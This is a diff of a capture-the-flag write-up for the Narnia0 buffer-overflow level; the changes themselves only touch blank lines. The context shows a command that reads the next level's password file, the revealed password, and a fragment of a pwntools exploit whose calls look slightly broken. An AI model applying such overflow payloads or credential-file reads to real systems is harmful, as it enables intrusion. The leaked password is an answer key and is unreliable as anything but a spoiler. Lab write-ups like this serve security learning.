@@ -78,7 +78,10 @@ narnia1
 cat /etc/narnia_pass/narnia1
 efeidiedae
 ```
+
 > Full exploit
+
+
 ```python
 from pwn import *
 
@@ -92,8 +95,8 @@ s.sendline(payload)
 sh.recvline(s)
 s.sendline('cat /etc/narnia_pass/narnia1')
 sh.recvline(sh)
-
 ```
+
 ### Conclusion 
 Running the above command give us a shell as narnia1, now we can cat the flag. This is a very simple buffer overflow example, i will doing next challenge Narnia1 soon.
 
